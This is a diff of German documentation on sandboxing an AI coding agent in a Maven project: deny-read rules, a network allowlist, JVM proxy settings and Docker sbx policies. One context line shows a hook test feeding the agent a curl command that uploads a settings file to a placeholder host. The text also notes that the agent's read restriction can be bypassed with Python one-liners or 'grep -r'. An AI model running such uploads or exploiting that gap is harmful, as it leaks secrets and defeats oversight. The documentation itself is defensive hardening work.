@@ -77,14 +77,18 @@ echo '{"tool_name":"Bash","tool_input":{"command":"curl http://x/ -d @settings.x
 
 Der `sandbox`-Block in `.claude/settings.json` umschließt **jedes
 Shell-Kommando** auf OS-Ebene: `filesystem.denyRead` für die Secret-Pfade
-(schließt die `cat`-Lücke, die die Read-Permission offen lässt),
+(schließt die Lücke, die die Read-Permission offen lässt: Claude Code wendet
+`deny Read` zwar auch auf erkannte Shell-Befehle wie `cat` oder `sed` an, nicht
+aber auf Skripte wie einen Python-Einzeiler oder ein `grep -r`),
 Netzwerk-Allowlist nur auf Maven Central, `failIfUnavailable: true`.
 
-> **JVM hinter dem Proxy (Claude-Code-Issue 16222):** Die JVM ignoriert
+> **JVM hinter dem Proxy:** Die JVM ignoriert
 > `HTTPS_PROXY`. Maven also **nicht** per `excludedCommands` aus der Sandbox
 > nehmen, sondern die JVM-Proxy-Properties setzen, z. B.
-> `MAVEN_OPTS="-Dhttps.proxyHost=… -Dhttps.proxyPort=…"`. In sbx erledigt das
-> `JAVA_TOOL_OPTIONS` automatisch (siehe E2E-Doku).
+> `MAVEN_OPTS="-Dhttps.proxyHost=… -Dhttps.proxyPort=…"`. Claude-Code-Issue
+> 16222 beschreibt dasselbe Problem für Gradle und Maven in Claude Code on the
+> Web. In sbx setzte die CLI im Test `JAVA_TOOL_OPTIONS` mit dem Proxy
+> (undokumentiert, siehe E2E-Doku).
 
 ### Schicht 4 — Docker Sandboxes / sbx (Listing 5 + 6)
 
@@ -100,13 +104,16 @@ docker save jm-java-sbx:latest -o /tmp/jm.tar && sbx template load /tmp/jm.tar
 ```bash
 sbx policy init balanced                               # global: Balanced-Profil
 sbx policy ls                                          # Balanced enthält Maven Central schon
-sbx policy check network repo.maven.apache.org:443     # -> Allowed (allow daher redundant)
+sbx policy check network repo.maven.apache.org:443     # -> im Test: Allowed (allow daher redundant)
 # sbx policy allow network "repo.maven.apache.org:443" # nur falls NICHT in Balanced
 sbx secret set anthropic                               # API-Key hinterlegen (einmalig)
-sbx run claude --pull never -t jm-java-sbx:latest .    # Agent in der microVM starten
+docker save jm-java-sbx:latest -o jm.tar && sbx template load jm.tar
+sbx run --pull never -t jm-java-sbx:latest claude .    # Agent in der microVM starten
 ```
 
-> `sbx policy set-default` ist in 0.47.0 **deprecated** → `sbx policy init`.
+> `sbx policy init` ersetzt in 0.47.0 das ältere `sbx policy set-default`.
+> Flags stehen vor dem Agenten (`sbx run [flags] [AGENT] [PATH]`); ohne
+> vorheriges `sbx template load` scheitert `--pull never`.
 > `sbx policy init` ändert die **globale** Policy für alle Sandboxes.
 
 Infrastruktur ohne Agent-Login prüfbar (Agent `shell` statt `claude`):
@@ -133,6 +140,8 @@ Flavor hat einen Docker-Daemon in der microVM). `claude-code-minimal` hätte
 keinen → Testcontainers scheitert dort. Zwei Stolpersteine sind in der
 `pom.xml` (Surefire) fest verdrahtet: `-Dapi.version=1.44` (docker-java handelt
 sonst API 1.32 aus, die der Daemon ablehnt) und `TESTCONTAINERS_RYUK_DISABLED=true`.
+Getestet ist Testcontainers 1.21.3; laut Release Notes macht erst 1.21.4 die
+1.21er-Reihe mit neueren Docker-Engines kompatibel (hier nicht getestet).
 `ContainerSmokeTest` überspringt sich, wenn kein Docker erreichbar ist.
 
 **Claudes OS-Sandbox in sbx:** redundant — die microVM isoliert bereits. Für den
